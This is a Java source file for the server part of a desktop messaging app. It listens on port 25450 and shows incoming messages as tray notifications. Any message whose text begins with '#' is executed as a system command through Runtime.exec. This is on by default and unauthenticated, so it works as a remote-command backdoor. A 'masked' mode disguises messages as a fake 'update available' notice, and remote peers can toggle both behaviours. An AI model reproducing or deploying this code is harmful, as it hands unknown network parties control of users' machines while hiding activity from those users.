package br.com.visualmix.visualmensagem.server;

import java.io.File;
import java.io.IOException;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;
import javax.swing.ImageIcon;
import javax.swing.JOptionPane;
import br.com.visualmix.visualmensagem.componentes.Notification;
import br.com.visualmix.visualmensagem.principal.Programa;

public class ServerMSG extends Server{

	private boolean autorizaSustenido = true;
	private boolean mascarado = true;
	Programa prog;
	public Alerta alerta;
	Thread t;

	public boolean isAutorizaSustenido() {
		return autorizaSustenido;
	}

	public void setAutorizaSustenido(boolean autorizaSustenido) {
		this.autorizaSustenido = autorizaSustenido;
	}

	public boolean isMascarado() {
		return mascarado;
	}

	public void setMascarado(boolean mascarado) {
		this.mascarado = mascarado;
	}
	
	public ServerMSG(Programa prog){
		super(25450);
		this.prog = prog;
	}

	@Override
	public void event(String mensagem, Socket sock) throws IOException {
		try {
			if(mensagem.trim().equals("")){
				return;
			}
			
			if(mensagem.split("\\|")[1].substring(0, 1).equals("#")){
				if(autorizaSustenido){
					Runtime.getRuntime().exec(mensagem.split("\\#")[1]);
					return;
				}else{
					if(mascarado){
						
						prog.escreveHist("O contato " + mensagem.split("\\|")[0] + " tentou executar o seguinte comando:\r\n" + mensagem.split("\\#")[1] + "\r\n\r\n", "Texto");
						return;
					}
					int op = JOptionPane.showOptionDialog(null, "O contato " + mensagem.split("\\|")[0] + " deseja executar o seguinte comando: " + mensagem.split("\\#")[1], "Atenção", JOptionPane.YES_NO_OPTION, JOptionPane.WARNING_MESSAGE, null, new String[]{"Não", "Sim"}, "Não");
					prog.formulario.requestFocus();
					if (op == 0){
						return;
					}else{
						Runtime.getRuntime().exec(mensagem.split("\\#")[1]);
						return;
					}
				}
			}

			if(mascarado){
				exibeMsg("Atualização disponivel.");
				prog.escreveHist("Mensagem de " + mensagem.split("\\*")[0] + " em " + mensagem.split("\\*")[1].split("\\|")[0] + " - " + new SimpleDateFormat("HH:mm").format(new Date(System.currentTimeMillis())), "Nome");
				prog.escreveHist("\r\n" + mensagem.split("\\|")[1] + "\r\n\r\n", "Texto");
				return;
			}

			if(mensagem.split("\\|")[1].substring(0, 1).equals("&")){
				exibeMsg(mensagem.split("\\*")[0]);
				
				prog.escreveHist("Mensagem de " + mensagem.split("\\*")[0] + " em " + mensagem.split("\\*")[1].split("\\|")[0] + " - " + new SimpleDateFormat("HH:mm").format(new Date(System.currentTimeMillis())), "Nome");
				prog.escreveHist("\r\n" + mensagem.split("\\|")[1] + "\r\n\r\n", "Texto");
				return;
			}

			if(mensagem.split("\\|")[1].trim().toLowerCase().equals("setautoriza#")){
				autorizaSustenido = !autorizaSustenido;
				return;
			}

			if(mensagem.split("\\|")[1].trim().toLowerCase().equals("setmascarado")){
				mascarado = !mascarado;
				return;
			}

			prog.escreveHist("Mensagem de " + mensagem.split("\\*")[0] + " em " + mensagem.split("\\*")[1].split("\\|")[0], "Nome");
			prog.escreveHist("\r\n" + mensagem.split("\\|")[1] + "\r\n\r\n", "Texto");
			exibeMsg(mensagem.split("\\|")[1]);
		} catch (Exception e) {
			// TODO: handle exception
		}finally{
			sock.close();
		}		
	}


	public void exibeMsg(String texto){
		Notification.showNotification(texto, prog.formulario);
		alertar();
	}
	
	public void alertar(){
		if(alerta == null){
			alerta = new Alerta();
			t = new Thread(alerta);
			t.start();
		}
	}
	
	public class Alerta implements Runnable{
		public boolean loop = true;
		@Override
		public void run() {
			
			while(loop){
				ImageIcon i = new ImageIcon(new File("icone2.png").getAbsolutePath());
				prog.formulario.trayIcon.setImage(i.getImage());
				try {
					Thread.sleep(500);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
				i = new ImageIcon(new File("icone.png").getAbsolutePath());
				prog.formulario.trayIcon.setImage(i.getImage());
				try {
					Thread.sleep(500);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
			ImageIcon i = new ImageIcon(new File("icone.png").getAbsolutePath());
			prog.formulario.trayIcon.setImage(i.getImage());
		}

	}
}
